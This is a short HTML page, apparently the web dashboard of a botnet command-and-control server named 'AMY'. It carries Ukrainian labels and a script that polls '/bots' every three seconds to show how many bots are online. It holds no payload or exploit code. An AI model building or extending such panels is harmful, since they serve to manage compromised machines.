<!DOCTYPE html>
<html lang="uk">

<head>
    <meta charset="UTF-8">
    <title>AMY Botnet C2</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="bg-zinc-950 text-red-400 p-10">
    <h1 class="text-6xl font-bold mb-8">AMY BOTNET C2</h1>
    <p class="text-2xl">UI працює на порту 8000</p>
    <p class="mt-6">Ботів онлайн: <span id="count">0</span></p>
    <script>
        async function update() {
            const res = await fetch('/bots');
            const data = await res.json();
            document.getElementById('count').textContent = data.bots.length;
        }
        setInterval(update, 3000);
        update();
    </script>
</body>

</html>
